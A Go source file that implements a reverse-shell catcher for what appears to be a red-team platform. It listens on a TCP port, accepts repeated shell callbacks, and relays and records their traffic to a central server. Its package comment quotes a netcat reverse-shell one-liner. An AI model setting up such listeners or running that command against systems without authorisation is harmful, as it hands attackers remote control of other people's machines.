// Package shell catches reverse shells and relays them to Oddjob.
//
// An operator gets a command execution primitive on a host and wants
// a shell out of it. The classic move is `nc <us> <port> -e /bin/sh`
// and the classic problem is where "<us>" is: the operator's laptop
// is not reachable from the client's estate, and a listener on the
// Oddjob server is a listener on the thing holding the engagement's
// data.
//
// The Ghost is already the right place. It sits on infrastructure
// the engagement chose, it is already attributable, it already has
// `--network host` so a bind is a real bind, and it already holds a
// websocket OUT to Oddjob -- which is the only direction that works
// through NAT, and is how the bytes get home.
//
// # One listener, many callbacks
//
// The listener is not consumed by the first connection. It accepts,
// hands the socket to a stream, and goes straight back to accepting:
// a shell that dies at 2am and a payload that retries every minute
// should produce a second session, not silence. That is the whole
// reason this is an Accept loop and not a one-shot dial.
//
// # What is recorded
//
// Everything, in both directions, as bytes. The server pairs what
// was typed with what came back -- see app/shelltunnel.py, which is
// honest about that pairing being best effort, because a shell is a
// byte stream and `sh` emits no marker saying where one command's
// output ends.
package shell

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"time"

	"github.com/xsecurity-ai/oddjob/ghost/internal/socksrelay"
)

// ReadChunk bounds one DATA frame off a shell. Small, because this
// is interactive: a 1 MB buffer would mean a prompt sat unflushed
// until something filled it.
const ReadChunk = 16 * 1024

// IdleTimeout closes a session that has said nothing and been told
// nothing. A shell whose far end vanished without a FIN otherwise
// holds a stream and a row that both claim to be live.
const IdleTimeout = 2 * time.Hour

// Transport is the half of the tunnel this needs: frames in, frames
// out. Satisfied by socksrelay.WS and by a pipe in the tests.
type Transport interface {
	Recv(ctx context.Context) ([]byte, error)
	Send(ctx context.Context, b []byte) error
}

// conn adapts a stream socket to the mux's sink.
type conn struct{ c net.Conn }

func (s conn) write(b []byte) error { _, err := s.c.Write(b); return err }
func (s conn) close() error         { return s.c.Close() }

// Listener holds one TCP port and relays every callback that lands
// on it. The tunnel, the stream ids and the read loop belong to the
// Mux -- see the note there for why a listener must not own them.
type Listener struct {
	Port int

	m  *Mux
	ln net.Listener
}

// Open binds the port. Separate from Run so a caller learns that the
// port is unavailable immediately rather than from a goroutine --
// "could not bind 4444" is an answer the operator needs while they
// are still looking at the screen, and is the difference between a
// listener row that says `failed: address already in use` and one
// that sits at `pending` for ever.
func Open(ctx context.Context, m *Mux, port int) (*Listener, error) {
	var lc net.ListenConfig
	ln, err := lc.Listen(ctx, "tcp", ":"+strconv.Itoa(port))
	if err != nil {
		return nil, fmt.Errorf("shell: cannot listen on %d: %w", port, err)
	}
	addr, ok := ln.Addr().(*net.TCPAddr)
	if !ok {
		_ = ln.Close()
		return nil, fmt.Errorf("shell: %s is not a tcp address", ln.Addr())
	}
	return &Listener{Port: addr.Port, m: m, ln: ln}, nil
}

// Run accepts callbacks until the context ends or the listener is
// closed. Each one becomes a stream; the loop continues either way.
func (l *Listener) Run(ctx context.Context) error {
	for {
		c, err := l.ln.Accept()
		if err != nil {
			// nil, deliberately: a cancelled context or a closed
			// listener is this shutting down on purpose, and
			// returning the error would make every clean stop look
			// like a failure in the agent's log.
			if ctx.Err() != nil || errors.Is(err, net.ErrClosed) {
				return nil //nolint:nilerr // a clean shutdown is not an error
			}
			// A failed accept is not a reason to stop listening. A
			// transient error -- a file-descriptor limit, a peer
			// that reset during the handshake -- must not end the
			// engagement's only way back in.
			continue
		}
		id := l.m.add(conn{c: c})
		// Announced BEFORE any bytes move, so the server has a
		// session to attach them to. A DATA frame for a stream the
		// server has never heard of has nowhere to go.
		_ = l.m.send(ctx, socksrelay.ARRIVED, id,
			announce(c.RemoteAddr().String(), "tcp", l.Port))
		go l.read(ctx, id, c)
	}
}

// read copies one callback's output home until it ends.
func (l *Listener) read(ctx context.Context, id uint32, c net.Conn) {
	defer l.m.drop(ctx, id)
	buf := make([]byte, ReadChunk)
	for {
		_ = c.SetReadDeadline(time.Now().Add(IdleTimeout))
		n, err := c.Read(buf)
		if n > 0 {
			if sendErr := l.m.send(ctx, socksrelay.DATA, id,
				buf[:n]); sendErr != nil {
				return
			}
		}
		if err != nil {
			return
		}
	}
}

// Close stops listening. The callbacks it caught belong to the Mux
// and are ended with it: a port being taken out of the configuration
// should not kill a shell somebody is typing at.
func (l *Listener) Close() error {
	return l.ln.Close()
}

// Live is how many callbacks are currently connected, across every
// listener on this tunnel. A count per port would mean the mux
// keeping a second table keyed by listener, for a number only the
// tests and the log line use.
func (l *Listener) Live() int { return l.m.live() }

var _ io.Closer = (*Listener)(nil)
